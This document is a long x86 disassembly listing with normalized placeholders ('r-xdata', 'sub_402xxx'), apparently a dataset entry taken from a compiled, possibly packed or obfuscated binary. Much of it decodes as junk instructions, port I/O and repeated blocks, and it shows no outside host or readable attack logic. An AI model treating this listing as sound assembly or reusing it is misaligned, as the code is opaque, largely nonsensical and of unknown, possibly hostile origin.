or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402a4b
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x739884b7
jg r-xdata
jne 0x24c13a9b
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afa9d2
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402a5b
ja 0x504ae62
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70a338
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4d011
jg r-xdata
jg 0xffffffff9c947e46
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ee72
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab37b
call sub_402afb
xor edi 0x517f5859
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16401815
jae r-xdata
je 0xffffffff814fcc11
jne r-xdata
jno 0xffffffff834f823f
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1336b
sub_402a5b
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf44ee72
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c13a9b
jno r-xdata
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402a5b
ja 0x504ae62
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afa9d2
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcab37b
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16401815
pop edx
jg r-xdata
jpo 0xf70a338
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fcc11
jne r-xdata
jno 0xffffffff834f823f
jg r-xdata
jg 0xffffffff9c947e46
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1336b
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4d011
call sub_402afb
xor edi 0x517f5859
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_402a7c
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401815
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab37b
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a338
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fcc11
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ee72
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c947e46
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f823f
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d011
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1336b
jg r-xdata
jne 0x24c13a9b
jae r-xdata
sub ecx 0xe1813e75
call sub_402afb
xor edi 0x517f5859
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa9d2
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402a5b
ja 0x504ae62
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_402ac7
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16401815
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcab37b
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70a338
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ee72
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_402afb
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fcc11
jne r-xdata
jno 0xffffffff834f823f
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c947e46
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1336b
jg r-xdata
jne 0x24c13a9b
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa9d2
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402a5b
ja 0x504ae62
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d011
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_402afb
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16401815
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab37b
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70a338
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fcc11
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ee72
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c947e46
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_402b46
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd843d
push edx
call sub_402a7c
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f823f
push ebp
call sub_4029d0
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4d011
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac1336b
jg r-xdata
jne 0x24c13a9b
jae r-xdata
sub ecx 0xe1813e75
call sub_402afb
xor edi 0x517f5859
jno 0xfffffffff2c185b8
push ecx
push ebx
call sub_402a4b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afa9d2
push edi
push eax
push edx
call sub_402a5b
ja 0x504ae62
pushfd
call sub_4029bb
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_402b46
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f5cfc
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ea2b
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1ab65
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46901
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
ja r-xdata
jge 0x71fc6ba3
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2af50
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16a8a
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6203
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jae r-xdata
ja 0xffffffffa3c33c60
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79ad5e
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9baf1d
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402c17
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ea2b
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46901
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc6ba3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1ab65
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
